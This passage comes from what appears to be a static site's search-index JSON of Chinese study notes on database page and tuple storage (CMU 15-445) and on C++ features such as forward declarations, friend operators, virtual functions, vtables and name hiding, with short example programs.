\u5c06\u6587\u4ef6\u7684\u5185\u5bb9\u6620\u5c04\u5230\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u5185\u3002</p> <p>\u4f46\u5b9e\u9645\u51fa\u4e8e\u6b63\u786e\u6027\u548c\u6027\u80fd\u539f\u56e0\uff0c\u4e00\u822c\u4e0d\u5efa\u8bae\u5728 DBMS \u4e2d\u4f7f\u7528 mmap\u3002</p>"},{"location":"Accumulation/CMU15-445/Storage/#file-storage-page","title":"File Storage &amp; Page","text":"<p>\u6570\u636e\u5e93\u5b58\u50a8\u5728\u78c1\u76d8\u4e0a\u7684\u57fa\u672c\u5f62\u5f0f\u662f File\uff0c\u5b83\u4eec\u4e00\u822c\u4ee5\u7279\u5b9a\u5f62\u5f0f\u8fdb\u884c\u7f16\u7801\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5bf9\u8fd9\u4e9b\u6587\u4ef6\u7684\u5185\u5bb9\u4e00\u65e0\u6240\u77e5\uff0c\u53ea\u6709 DBMS \u77e5\u9053\u5982\u4f55\u89e3\u7801\u5185\u5bb9\u3002</p> <p>DBMS \u7684\u5b58\u50a8\u7ba1\u7406\u5668\u8d1f\u8d23\u7ba1\u7406\u6570\u636e\u5e93\u7684\u6587\u4ef6\uff0c\u5b83\u5c06\u6587\u4ef6\u8868\u793a\u4e3a Page \u7684\u96c6\u5408\uff0c\u5e76\u4f1a\u5bf9\u5df2\u8bfb\u53d6\u548c\u5199\u5165\u7684 Page \u8fdb\u884c\u8ddf\u8e2a\u3002</p> <p>Page \u4e2d\u53ef\u4ee5\u5305\u542b\u4e0d\u540c\u7c7b\u578b\u7684\u6570\u636e\uff08\u7d22\u5f15\u3001\u5143\u7ec4...\uff09\uff0c\u4f46\u5927\u591a\u6570\u7cfb\u7edf\u4e0d\u4f1a\u5728\u4e00\u4e2a Page \u4e2d\u6df7\u7528\u7c7b\u578b\u3002\u4e5f\u6709\u67d0\u4e9b\u7cfb\u7edf\u8981\u6c42 Page \u662f Self-contained\uff0c\u5373\u8bfb\u53d6\u6bcf\u4e00\u4e2a Page \u6240\u9700\u7684\u4fe1\u606f\u90fd\u5728 Page \u672c\u8eab\u4e2d\u3002</p> <p>\u6bcf\u4e2a Page \u90fd\u5e94\u5177\u6709\u72ec\u7279\u7684\u6807\u8bc6\u7b26\u3002\u5927\u591a\u6570 DBMS \u90fd\u5177\u6709\u4e00\u4e2a\u95f4\u63a5\u5c42\uff0c\u7528\u4e8e\u5c06 Page ID \u6620\u5c04\u4e3a file path and offset\u3002</p> <p>\u5982\u679c\u6570\u636e\u5e93\u662f\u4e00\u4e2a\u5355\u6587\u4ef6\uff0c\u90a3\u4e48\u53ef\u4ee5\u76f4\u63a5\u4ee4\u504f\u79fb\u91cf\u4e3a Page ID\uff0c\u4e0d\u9700\u8981 file path</p> <p>DBMS locate a page on disk by using linked list or page directory</p> <ul> <li>Linked List: Header Page holds pointers to a list of free pages and a list of data pages.<ul> <li>\u4f46\u662f\u5f53\u6211\u4eec\u60f3\u627e\u4e00\u4e2a\u7279\u5b9a\u7684 Page \u65f6\uff0c\u5fc5\u987b\u8fdb\u884c\u7ebf\u6027\u626b\u63cf</li> </ul> </li> <li>Page Directory: DBMS \u7ef4\u62a4\u4e00\u4e2a\u7279\u6b8a\u7684 Page\uff0c\u7528\u4e8e\u8ddf\u8e2a Date Pages \u7684\u4f4d\u7f6e\u4ee5\u53ca\u5176\u5269\u4f59\u53ef\u7528\u7a7a\u95f4\u3002</li> </ul> <p>\u652f\u6301\u53ef\u53d8\u5927\u5c0f Page \u6240\u9700\u5f00\u9500\u8f83\u5927\uff0c\u56e0\u6b64 DBMS \u4e00\u822c\u90fd\u4f7f\u7528\u56fa\u5b9a\u5927\u5c0f\u7684 Page\u3002Page \u7684\u4e09\u4e2a\u76f8\u5173\u6982\u5ff5\uff1a</p> <ul> <li>&lt;1&gt; Hardware Page (usually 4KB)</li> <li>&lt;2&gt; OS Page (4KB)</li> <li>&lt;3&gt; Database Page (1-16KB)</li> </ul> <p>\u5b58\u50a8\u8bbe\u5907\u4fdd\u8bc1\u80fd\u591f\u652f\u6301 Hardware Page \u5927\u5c0f\u7684 atomic write\u3002\u4f46\u662f\u5982\u679c Database Page \u5927\u5c0f\u5927\u4e8e Hardware Page\uff0c\u5f53\u7cfb\u7edf\u53d1\u751f\u9519\u8bef\u5d29\u6e83\u65f6\uff0c\u7a0b\u5e8f\u5f88\u6709\u53ef\u80fd\u4f1a\u5728\u6570\u636e\u5e93 Page \u5199\u5165\u78c1\u76d8\u7684\u9014\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u91c7\u53d6\u989d\u5916\u7684\u63aa\u65bd\u6765\u4fdd\u8bc1\u6570\u636e\u5b89\u5168\u3001\u5b8c\u6574\u7684\u5199\u5165\u3002</p> <p>\u539f\u5b50\u5199 Atomic Write</p> <p>\u4e00\u4e2a\u4e0d\u53ef\u5206\u5272\u7684 IO \u5199\u64cd\u4f5c\uff0c\u8981\u4e48\u4e00\u8d77\u7ed3\u675f\uff0c\u8981\u4e48\u4e00\u8d77\u56de\u9000\u3002</p>"},{"location":"Accumulation/CMU15-445/Storage/#page","title":"Page \u7ed3\u6784","text":"<p>Page \u7684\u5f00\u5934\u901a\u5e38\u5305\u542b\u4e00\u4e2a Header\uff0c\u7528\u6765\u5b58\u50a8\u5173\u4e8e\u5185\u5bb9\u7684\u5143\u6570\u636e\uff1a</p> <ul> <li>Page Size</li> <li>Checksum</li> <li>DBMS version</li> <li>Transaction visibility</li> <li>Self-containment (\u67d0\u4e9b\u7cfb\u7edf\uff0c\u5982 Oracle \u9700\u8981\u8fd9\u4e2a)</li> </ul> <p>Page \u4e2d\u6570\u636e\u7684\u5e03\u5c40\u6709\u4e24\u79cd\u4e3b\u8981\u65b9\u5f0f\uff0c\u5206\u522b\u4e3a slotted-pages \u548c log-structured\u3002</p> <p>Slotted Pages: Page maps slots to offsets</p> <ul> <li>\u662f DBMS \u4e2d\u6700\u5e38\u7528\u7684\u505a\u6cd5</li> <li>\u5728 Header \u4e2d\uff0c\u4f1a\u8ddf\u8e2a\u5df2\u7ecf\u4f7f\u7528\u7684 slot \u6570\u91cf\u3001\u4e0a\u4e00\u6b21\u4f7f\u7528\u7684 slot \u7684\u504f\u79fb\u91cf\uff0c\u4ee5\u53ca\u4e00\u4e2a slot \u6570\u7ec4<ul> <li>Slot \u662f\u7b49\u957f\u7684\uff0c\u5b58\u50a8\u7740\u5bf9\u5e94\u5143\u7ec4\u7684\u504f\u79fb\u91cf\u548c\u957f\u5ea6\u7b49\u6570\u636e\uff1b\u800c\u5143\u7ec4\u53ef\u4ee5\u662f\u4e0d\u5b9a\u957f\u7684\u3002</li> </ul> </li> <li>slot \u6570\u7ec4\u4ece\u5f00\u5934\u589e\u957f\u5230\u7ed3\u5c3e\uff0c\u5143\u7ec4\u4ece\u672b\u5c3e\u589e\u957f\u5230\u5f00\u5934\uff0c\u5f53\u5b83\u4eec\u76f8\u9047\u65f6\uff0c\u89c6\u4e3a\u8be5 Page \u5df2\u6ee1</li> </ul> <p></p> <p>Log-Structure Storage: Instead of storing tuples, the DBMS only store log records</p> <ul> <li>\u5b58\u50a8\u7740\u6570\u636e\u5e93\u5982\u4f55\u88ab\u4fee\u6539\uff08\u63d2\u5165\u3001\u5220\u9664\u7b49\uff09\u7684\u8bb0\u5f55\uff0c\u4fdd\u5b58\u4e3a log file</li> <li>\u4e3a\u4e86\u5b9e\u73b0\u8bfb\u53d6\uff0cDBMS \u4f1a\u4ece\u540e\u5f80\u524d\u626b\u63cf log file\uff0c\u627e\u5230\u6700\u65b0\u7684\u5bf9\u67d0 tuple ID \u64cd\u4f5c\u7684\u8bb0\u5f55</li> <li>\u6162\u8bfb\u5feb\u5199\u3002</li> <li>\u5728 append-only storage \u4e2d\u5de5\u4f5c\u826f\u597d</li> <li>\u4e3a\u4e86\u907f\u514d\u957f\u65f6\u95f4\u7684\u8bfb\u53d6\uff0cDBMS \u53ef\u4ee5\u4e3a\u5176\u589e\u52a0\u7d22\u5f15\uff0c\u4ee5\u5feb\u901f\u68c0\u7d22\u8bb0\u5f55</li> <li>\u6570\u636e\u5e93\u8bb0\u5f55\u4f1a\u88ab\u5b9a\u671f\u538b\u7f29\u5408\u5e76</li> <li>\u4e0d\u518d\u9700\u8981 temporal information\uff0c\u5e76\u4e14\u5143\u7ec4\u641c\u7d22\u64cd\u4f5c\u975e\u5e38\u5feb</li> </ul> <p>What is the downsides of this approach</p> <ul> <li>Write-Amplification \u5199\u5165\u653e\u5927<ul> <li>\u5373\u5b9e\u9645\u5199\u5165\u7684\u6570\u636e\u91cf\u662f\u5199\u5165\u6570\u636e\u91cf\u591a\u500d\uff0c</li> </ul> </li> <li>Compaction is Expensive</li> </ul>"},{"location":"Accumulation/CMU15-445/Storage/#tuple","title":"Tuple \u7ed3\u6784","text":"<p>\u5143\u7ec4\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u5b57\u8282\u5e8f\u5217\uff0cDBMS \u5c06\u8fd9\u4e9b\u5b57\u8282\u89e3\u91ca\u4e3a\u5c5e\u6027\u7c7b\u578b\u548c Value\u3002</p> <ul> <li>Tuple Header: Contain meta-data about tuple<ul> <li>DBMS's concurrency control protocol \u7684\u53ef\u89c1\u4fe1\u606f</li> <li>Bit Map for <code>NULL</code> values</li> <li>\u6ce8\u610f DBMS \u4e0d\u5728\u8fd9\u91cc\u5b58\u50a8\u6709\u5173\u6570\u636e\u5e93\u67b6\u6784\u7684\u5143\u6570\u636e</li> </ul> </li> <li>Tuple Data: Actual data for attributes<ul> <li>Attribute \u901a\u5e38\u6309\u7167\u521b\u5efa\u8868\u65f6\u6307\u5b9a\u7684\u987a\u5e8f\u5b58\u50a8</li> </ul> </li> <li>Unique Identifier:<ul> <li>\u6bcf\u4e2a\u5143\u7ec4\u90fd\u5206\u914d\u6709\u4e00\u4e2a\u72ec\u7279\u6807\u8bc6</li> <li>\u6700\u5e38\u89c1\uff1a <code>page_id + (offset or slot)</code></li> </ul> </li> </ul> <p>Denormalized Tuple Data \u975e\u89c4\u8303\u5143\u7ec4\u6570\u636e</p> <p>\u5982\u679c\u4e24\u4e2a\u8868\u662f\u76f8\u5173\u7684\uff0c\u90a3\u4e48 DBMS \u53ef\u4ee5\u9884\u5148\u8fde\u63a5\u5b83\u4eec\uff0c\u5373\u5c06\u5b83\u4eec\u8868\u73b0\u5728\u540c\u4e00\u4e2a Page \u4e2d\u8fdb\u884c\u5904\u7406\u3002\u8fd9\u5c06\u4f7f\u5f97\u8bfb\u53d6\u901f\u5ea6\u975e\u5e38\u5feb\uff0c\u4f46\u4e5f\u4f1a\u5e26\u6765\u66f4\u9ad8\u7684\u66f4\u65b0\u6210\u672c\u3002</p>"},{"location":"Accumulation/CMU15-445/Storage/#data-representation","title":"Data Representation","text":"<p>Tuples \u4e2d\u53ef\u4ee5\u5b58\u50a8\u4e94\u79cd\u9ad8\u7ea7\u6570\u636e\u7c7b\u578b\uff1a</p> <ul> <li>Integers \u6574\u6570</li> <li>Variable Precision Number \u53ef\u53d8\u7cbe\u5ea6\u6570\u5b57<ul> <li>\u4f46\u5e76\u975e\u4efb\u610f\u957f\u5ea6</li> </ul> </li> <li>Fixed-Point Precision Number \u5b9a\u70b9\u7cbe\u5ea6\u6570<ul> <li>\u5177\u6709\u4efb\u610f\u7cbe\u5ea6\u548c\u4f4d\u6570\uff0c\u4f46\u9700\u8981 meta-data \u544a\u8bc9\u957f\u5ea6\u548c\u5c0f\u6570\u70b9\u4f4d\u7f6e</li> </ul> </li> <li>Data &amp; Time<ul> <li>\u8868\u73b0\u5f62\u5f0f\u56e0\u4e0d\u540c\u7cfb\u7edf\u800c\u5f02\uff0c\u4f46\u901a\u5e38\u662f unix \u65f6\u95f4</li> </ul> </li> <li>System Catalog \u7cfb\u7edf\u76ee\u5f55<ul> <li>\u7ef4\u62a4\u4e86\u4e00\u4e2a internal catalog \u7528\u6765\u5b58\u50a8\u6570\u636e\u5e93\u7684\u5143\u6570\u636e\u7b49</li> <li><code>INFORMATION_SCHEMA</code></li> </ul> </li> </ul>"},{"location":"Accumulation/CS106L/","title":"Index","text":"<p> \u7ea6 23 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>\u5c1d\u8bd5\u53ea\u770b slides \u901f\u901a\u4e00\u4e0b C++\uff0c\u5e76\u901a\u8fc7 ZJU OOP \u76f8\u5173\u5185\u5bb9\u8fdb\u884c\u8865\u5145\u3002</p>"},{"location":"Accumulation/CS106L/Addition/","title":"\u8865\u5145","text":""},{"location":"Accumulation/CS106L/Addition/#c","title":"C++ \u8865\u5145","text":"<p> \u7ea6 3281 \u4e2a\u5b57  591 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 24 \u5206\u949f</p> <p>From \u54b8\u9c7c\u6684\u7684\u4ee3\u7801\u7a7a\u95f4 &amp; ZJU OOP</p>"},{"location":"Accumulation/CS106L/Addition/#class","title":"Class","text":""},{"location":"Accumulation/CS106L/Addition/#forward-declaration","title":"Forward Declaration","text":"<p>\u5982\u679c\u5f53\u524d\u4f5c\u7528\u57df\u6ca1\u6709\u540d\u4e3a\u00a0<code>identifier</code>\u00a0\u7684\u7c7b\uff0c\u90a3\u4e48\u5f62\u5982\u00a0<code>class-key attr identifier;</code>\u00a0\u7684\u58f0\u660e\u662f\u4e00\u4e2a forward declaration class.name#2\u3002</p> <p>\u4f8b\u5982\u00a0<code>class Foo;</code>\uff0c\u5b83\u58f0\u660e\u4e86\u4e00\u4e2a\u53eb\u00a0<code>Foo</code>\u00a0\u7684\u7c7b\uff1b\u4f46\u76f4\u5230\u8fd9\u4e2a\u7c7b\u88ab\u5b9a\u4e49\u4e4b\u524d\uff0c\u5b83\u7684\u7c7b\u578b\u662f\u4e0d\u5b8c\u6574\u7684basic.types.general#5\u3002</p> <p>\u4e0d\u5b8c\u6574\u7684\u7c7b\u578b\u6709\u4e00\u4e9b\u9650\u5236\uff0c\u4f46\u662f\u4e5f\u6709\u4e00\u4e9b\u53ef\u4ee5\u5b8c\u6210\u7684\u64cd\u4f5c\u3002\u4f8b\u5982\u4e0d\u5b8c\u6574\u7684\u7c7b\u578b\u4e0d\u80fd\u7528\u6765\u5b9a\u4e49\u53d8\u91cf\uff08\u5305\u62ec\u6210\u5458\u53d8\u91cf\uff09\u3001\u4f5c\u4e3a\u51fd\u6570\u58f0\u660e\u6216\u5b9a\u4e49\u7684\u53c2\u6570\u6216\u8005\u8fd4\u56de\u503c\u7c7b\u578b\u7b49\uff1b\u4f46\u662f\u53ef\u4ee5\u5b9a\u4e49\u6307\u5411\u5b83\u7684\u6307\u9488\u3002</p> <p>\u4f8b\u5982\uff0c\u5e38\u89c1\u7684\u7528\u9014\u662f\uff0c\u4e24\u4e2a\u7c7b\u53ef\u80fd\u4f1a\u4e92\u76f8\u4f7f\u7528\u3002\u8fd9\u65f6\u5c31\u53ef\u4ee5\u5199\u51fa\u7c7b\u4f3c\u4e0b\u9762\u8fd9\u6837\u7684\u4ee3\u7801\uff1a</p> <pre><code>struct X;\nstruct Y {\n    X* ptr;\n    // X mem; // Error: field has incomplete type 'X'\n    X* foo();\n};\nstruct X {\n    Y* ptr;\n    Y* bar();\n};\n</code></pre> <p>\u8fd9\u65f6\u7b2c 1 \u884c\u662f\u5fc5\u987b\u7684\uff0c\u5426\u5219\u7b2c 3 \u884c\u7684\u00a0<code>X</code>\u00a0\u5c31\u662f\u4e00\u4e2a\u672a\u77e5\u7684\u7c7b\u578b\u3002</p> <p>\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u58f0\u660e <code>struct X</code> \u4e3a\u9759\u6001\u7ed3\u6784\u4f53\u3002</p>"},{"location":"Accumulation/CS106L/Addition/#using","title":"Using","text":"<p>C++11 \u5f15\u5165\u4e86\u00a0<code>using</code>\u00a0\u6765\u58f0\u660e\u7c7b\u578b\u522b\u540d\uff0c\u5b83\u7684\u7528\u9014\u548c\u00a0<code>typedef</code>\u00a0\u7c7b\u4f3c\uff0c\u5982\u00a0<code>typedef struct arraylist_* arraylist;</code>\u00a0\u53ef\u4ee5\u5199\u6210\u00a0<code>using arraylist = struct arraylist_ *;</code>\u3002</p> <p>\u7c7b\u578b\u522b\u540d\u7684\u58f0\u660e\u4e5f\u53ef\u4ee5\u662f\u7c7b\u7684\u6210\u5458\uff0c\u5176\u4f5c\u7528\u57df\u662f\u7c7b\u7684\u4f5c\u7528\u57df\uff0c\u540c\u6837\u53d7 access-specifier \u7684\u5f71\u54cd\u3002\u4f8b\u5982\uff1a</p> <pre><code>struct Foo {\n    using elem = int;\n    elem x;     // OK, x has type int\n    elem add(elem v) { x += v; return x; }\nprivate:\n    using type = char;\n    type c;     // OK, c has type char\n};\n\n// elem y;      // Error: unknown type name 'elem'\nFoo::elem z;    // OK, z has type int\n// Foo::type c; // Error: 'type' is a private member of 'Foo'\n</code></pre> <p><code>using</code> \u4e00\u822c\u662f\u4e3a\u4e86\u652f\u6301\u6a21\u677f\u800c\u4f7f\u7528\u3002</p>"},{"location":"Accumulation/CS106L/Addition/#friend","title":"friend","text":"<p>\u5728\u5bf9\u4e00\u4e2a\u77e9\u9635\u7c7b\u8fdb\u884c\u4e58\u6cd5\u8fd0\u7b97\u7b26\u91cd\u8f7d\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5f88\u8f7b\u677e\u7684\u6784\u9020\u51fa <code>Matrix * int</code> \u7684\u60c5\u51b5\uff0c\u53ea\u9700\u8981\u5728\u7c7b\u4e2d\u5199\u5165\uff1a</p> <pre><code>    Matrix operator*(int x)\n    {\n        ...\n    }\n</code></pre> <p>\u4f46\u662f <code>int * Matrix</code> \u53c8\u5982\u4f55\u5b9e\u73b0\u5462\uff1f\u8be5\u8bed\u53e5\u88ab\u89e3\u91ca\u4e3a <code>int::operator*(Matrix)</code> \uff0c\u4f46\u662f <code>int</code> \u7c7b\u4e2d\u53c8\u6ca1\u6709\u5bf9\u5e94\u91cd\u8f7d\uff0c\u6211\u4eec\u53ea\u80fd\u5c06\u8fd0\u7b97\u7b26\u91cd\u8f7d\u653e\u5728\u5168\u5c40\u4f5c\u7528\u8303\u56f4\u5185\uff0c\u5e76\u4f7f\u7528\u53cb\u5143\u51fd\u6570\u4f7f\u5176\u80fd\u591f\u8bbf\u95ee\u7c7b\u7684\u79c1\u6709\u6210\u5458\uff1a</p> <pre><code>const int M = 100;\nclass Matrix {\n    int data[M][M];\npublic:\n    Matrix operator+(Matrix mat) { /* */ }\n    Matrix operator*(int x) { /* */ }\n    Matrix operator*(Matrix mat) { /* */ }\n    friend Matrix operator*(int x, Matrix mat); // Designates a function as friend of this class\n};\nMatrix operator*(int x, Matrix mat) {\n    Matrix tmp = mat;   // copy mat\n    for (int i = 0; i &lt; M; i++)\n        for (int j = 0; j &lt; M; j++)\n            tmp.data[i][j] *= x;        // can access private member Matrix::data\n    return tmp;\n}\n</code></pre> <p><code>x * y</code> \u4f1a\u88ab\u91cd\u8f7d\u89e3\u6790\u89e3\u91ca\u4e3a <code>x.operator*(y)</code> \u6216\u8005 <code>operator*(x, y)</code></p> <p>\u5f53\u7136\uff0c\u66f4\u597d\u7684\u65b9\u5f0f\u662f\uff1a</p> <pre><code>const int M = 100;\nclass Matrix {\n    int data[M][M];\npublic:\n    Matrix operator+(Matrix mat) { /* */ }\n    Matrix operator*(int x) { /* */ }\n    Matrix operator*(Matrix mat) { /* */ }\n};\nMatrix operator*(int x, Matrix mat) {\n    return mat * x;\n}\n</code></pre>"},{"location":"Accumulation/CS106L/Addition/#virtual","title":"Virtual","text":"<p>Virtual \u4e3a\u5b50\u7c7b\u63d0\u4f9b\u4e86\u5b9e\u73b0\u7684\u63a5\u53e3\u3002\u5176\u5e95\u5c42\u5b9e\u73b0\u65b9\u5f0f\u662f\u4e00\u4e2a 8 \u5b57\u8282\u7684\u5730\u5740 <code>vptr</code> \u6307\u5411\u4e00\u4e2a\u8868\uff0c\u53ef\u4ee5\u7528\u5982\u4e0b\u4e00\u4e2a\u7b80\u5355\u7a0b\u5e8f\u8fdb\u884c\u9a8c\u8bc1\uff1a</p> <pre><code>class base {\npublic:\n    base() : data (10) {}\n    void foo() { std::cout &lt;&lt; \"base::foo()\" &lt;&lt; std::endl; }\n    virtual void bar() { std::cout &lt;&lt; \"base::bar()\" &lt;&lt; std::endl; }\nprivate:\n    int data;\n};\n\nint main()\n{\n    base b;\n    b.foo(); // Calls base::foo()\n    b.bar(); // Calls base::bar()\n\n    std::cout &lt;&lt; \"Size of b is: \" &lt;&lt; sizeof(b) &lt;&lt; std::endl;\n    /* @output:\n    * Size of b is: 16\n    * The size of the private member 'data' is 4 bytes.\n    * The size of the address of the virtual function table (vptr) is 8 bytes on a 64-bit system.\n    * And the remaining 4 bytes are for the padding to align the size of the class to 8 bytes.\n    * So the total size is 4 + 8 + 4 = 16 bytes.\n    */\n\n    int * p = (int*)(&amp;b);\n    std::cout &lt;&lt; *p &lt;&lt; std::endl; // 4206736\n    p++;\n    std::cout &lt;&lt; *p &lt;&lt; std::endl; // 1\n    p++;\n    std::cout &lt;&lt; *p &lt;&lt; std::endl; // 10\n\n    return 0;\n}\n</code></pre> <p>\u8fd9\u4e5f\u80fd\u8bf4\u660e <code>private</code> \u6210\u5458\u4ece\u5916\u90e8\u53ef\u4ee5\u901a\u8fc7\u6307\u9488\u8bbf\u95ee\uff0c\u53ea\u9700\u8981\u6211\u4eec\u6478\u6e05\u5185\u90e8\u5185\u5b58\u7ed3\u6784</p> <p>\u4e00\u4e2a\u7236\u7c7b\u7684\u6210\u5458\u51fd\u6570\u88ab\u58f0\u660e\u4e3a <code>virtual</code> \u540e\uff0c\u5b83\u7684\u6240\u6709\u5b50\u7c7b\u540c\u540d\u51fd\u6570\u90fd\u4f1a\u88ab\u9690\u5f0f\u5730\u58f0\u660e\u4e3a\u865a\u51fd\u6570\uff0c\u56e0\u6b64\u6bcf\u4e2a\u7c7b\u90fd\u6709\u5176\u5404\u81ea\u4e14\u4e0d\u540c\u7684 <code>vtpr</code>\u3002</p> <p>\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a</p> <pre><code>class A {\npublic:\n    A() { f(); }\n    virtual void f() { cout &lt;&lt; \"A::f()\"; }\n};\nclass B : public A {\npublic:\n    B() { f(); }\n    void f() { cout &lt;&lt; \"B::f()\"; }\n};\nB temp;\n\n// A::f()B::f()\n</code></pre> <p>\u865a\u51fd\u6570\u6839\u636e\u8fd0\u884c\u65f6\u5b9e\u9645\u5bf9\u8c61\u7684\u7c7b\u578b\u6765\u51b3\u5b9a\u6700\u7ec8\u8c03\u7528\u54ea\u4e2a\u51fd\u6570\uff0c\u8fd9\u4e00\u8fc7\u7a0b\u79f0\u4e3a\u591a\u6001(Polymorphism)\u3002</p> <pre><code>#include &lt;iostream&gt;\n\nstruct A {\n    virtual void f() { std::cout &lt;&lt; \"Af\" &lt;&lt; std::endl; }\n    virtual void f(int) { std::cout &lt;&lt; \"Afi\" &lt;&lt; std::endl; }\n    virtual void f(int, int) { std::cout &lt;&lt; \"Afii\" &lt;&lt; std::endl; }\n};\n\nstruct B : public A {\n    void f() override { std::cout &lt;&lt; \"Bf\" &lt;&lt; std::endl; }\n    void f(int) override { std::cout &lt;&lt; \"Bfi\" &lt;&lt; std::endl; }\n};\n\nstruct C : public B {\n    void f() override { std::cout &lt;&lt; \"Cf\" &lt;&lt; std::endl; }\n};\nint main()\n{\n    C obj;\n\n    C &amp;c = obj;\n    B &amp;b = obj;\n    A &amp;a = obj;\n\n    a.f();       // Cf\n    a.f(1);      // Bfi\n    a.f(1,2);    // Afii\n\n    b.f();       // Cf\n    b.f(1);      // Bfi\n    // b.f(1,2); // compile error\n\n    c.f();       // Cf\n    // c.f(1);   // compile error\n    // c.f(1,2); // compile error\n}\n</code></pre> <p>\u5f53\u7f16\u8bd1\u5668\u770b\u5230\u88ab\u8c03\u7528\u7684\u51fd\u6570\u7b7e\u540d\u4e3a <code>virtual</code> \u7c7b\u578b\uff0c\u5b83\u5c31\u4f1a\u53bb\u67e5\u8be2\u5b9e\u9645\u7c7b\u578b <code>C</code> \u5bf9\u5e94\u7684 virtual function table\uff0c<code>C::vtable</code> \u5728\u7ee7\u627f\u548c\u8986\u5199\u540e\uff0c\u6700\u7ec8\u53d8\u5316\u5982\u4e0b\uff1a</p> Offset Function 0 <code>C::f()</code> 1 <code>B::f(int)</code> 2 <code>A::f(int, int)</code> <p>\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u6700\u7ec8\u8f93\u51fa\u53ea\u6709 <code>Cf, Bfi, Afii</code> \u4e09\u79cd\u3002\u90a3\u4e48\u53c8\u662f\u4ec0\u4e48\u5bfc\u81f4\u7f16\u8bd1\u9519\u8bef\u5462\uff1f\u8fd9\u662f C++ \u5173\u4e8e\u8986\u5199\u7684\u53e6\u4e00\u4e2a\u7279\u6027 Name Hiding\uff1a</p> <ul> <li>\u5982\u679c\u5b50\u7c7b\u5b9a\u4e49\u4e86\u57fa\u7c7b\u7684\u67d0\u4e2a\u51fd\u6570\u540d\uff0c\u90a3\u4e48\u57fa\u7c7b\u7684\u6240\u6709\u540c\u540d\u91cd\u8f7d\u90fd\u5c06\u88ab\u9690\u85cf\uff0c\u5373\u4fbf\u5b83\u4eec\u7684\u53c2\u6570\u4e0d\u540c<ul> <li>\u8fd9\u4e00\u64cd\u4f5c\u4f4d\u4e8e\u67e5\u627e <code>vtable</code> \u4e4b\u524d\uff0c\u5e76\u4e14\u662f\u4f9d\u636e\u9759\u6001\u7c7b\u578b\u7684\u51fd\u6570\u540d\u67e5\u627e\u548c\u9759\u6001\u89e3\u6790</li> </ul> </li> <li>\u6b64\u4f8b\u4e2d\uff0c\u5b50\u7c7b <code>C</code> \u8986\u5199\u4e86 <code>f()</code>\uff0c\u5bfc\u81f4 <code>f(int)</code> \u548c <code>f(int, int)</code> \u90fd\u88ab\u9690\u85cf\uff0c\u6b64\u65f6\u5373\u4fbf\u5b83\u4eec\u90fd\u4f4d\u4e8e <code>C::vtable</code> \u4e2d\uff0c\u5b9e\u9645\u53ef\u89c1\u7684\u4e5f\u53ea\u6709 <code>C::f()</code>\uff08\u5728\u67e5\u627e <code>vtable</code> \u524d\u7f16\u8bd1\u5c31\u5931\u8d25\u4e86\uff09</li> </ul> \u8c03\u7528 <code>b.f(1);</code> \u7684\u8fc7\u7a0b <ul> <li>Step 1: \u540d\u5b57\u67e5\u627e<ul> <li>\u7f16\u8bd1\u5668\u770b\u5230 <code>b.f(1)</code>\uff0c\u5206\u6790\u5f97\u5230\u9759\u6001\u7c7b\u578b\u4e3a <code>B&amp;</code></li> <li>\u5728 <code>B</code> \u4e2d\u67e5\u627e\u51fd\u6570\u540d <code>f</code>\uff0c\u627e\u5230\u4e86\u4e24\u4e2a\u91cd\u8f7d<ul> <li><code>void f()</code></li> <li><code>void f(int)</code></li> </ul> </li> </ul> </li> <li>Step 2: \u91cd\u8f7d\u51b3\u8bae<ul> <li>\u6839\u636e\u4f20\u5165\u53c2\u6570\uff0c\u5339\u914d\u5408\u9002\u7248\u672c</li> <li>\u6b64\u5904 <code>void f(int)</code> \u7b26\u5408\uff0c\u7f16\u8bd1\u901a\u8fc7</li> </ul> </li> <li>Step 3: \u865a\u51fd\u6570\u8c03\u5ea6<ul> <li>\u6839\u636e\u5176\u52a8\u6001\u7c7b\u578b <code>C</code> \u67e5\u627e <code>vtable</code>\uff0c\u627e\u5230\u69fd\u4f4d <code>B::f(int)</code></li> </ul> </li> </ul> <p>\u5982\u679c\u5e0c\u671b\u7f16\u8bd1\u5668\u80fd\u627e\u5230\u6240\u6709\u91cd\u8f7d\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>using</code> \u663e\u5f0f\u5f15\u5165\uff1a</p> <pre><code>struct B : public A {\n    using A::f;  // \ud83d\udc48 \u663e\u5f0f\u5f15\u5165\u6240\u6709 A::f\n    void f() override { std::cout &lt;&lt; \"Bf\" &lt;&lt; std::endl; }\n    void f(int) override { std::cout &lt;&lt; \"Bfi\" &lt;&lt; std::endl; }\n};\n\nstruct C : public B {\n    using B::f;  // \ud83d\udc48 \u663e\u5f0f\u5f15\u5165\u6240\u6709 B::f\n    void f() override { std::cout &lt;&lt; \"Cf\" &lt;&lt; std::endl; }\n};\n</code></pre> <p>\u540d\u5b57\u9690\u85cf\u662f\u9759\u6001\u7c7b\u578b\u9a71\u52a8\u7684\u884c\u4e3a\uff0c\u800c\u865a\u51fd\u6570\u8c03\u5ea6\u662f\u52a8\u6001\u7c7b\u578b\u9a71\u52a8\u7684\u884c\u4e3a</p>"},{"location":"Accumulation/CS106L/Addition/#_1","title":"\u751f\u547d\u5468\u671f","text":"<p>C++ Memory Model</p> <p></p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u7c7b\u5bf9\u8c61\uff0c\u5b83\u7684\u751f\u547d\u5468\u671f(lifetime)\u4ece\u5b83\u7684\u6784\u9020\u51fd\u6570\u5b8c\u6210\u5f00\u59cb\uff0c\u5230\u5b83\u7684\u6790\u6784\u51fd\u6570\u88ab\u8c03\u7528\u65f6\u7ed3\u675f\u3002</p> <p>\u4efb\u4f55\u4e00\u4e2a\u5bf9\u8c61\u90fd\u4f1a\u5360\u7528\u5b58\u50a8\uff0c\u8fd9\u90e8\u5206\u5b58\u50a8\u7684\u6700\u5c0f\u751f\u547d\u5468\u671f\u79f0\u4e3a\u8fd9\u4e2a\u5bf9\u8c61\u7684 storage 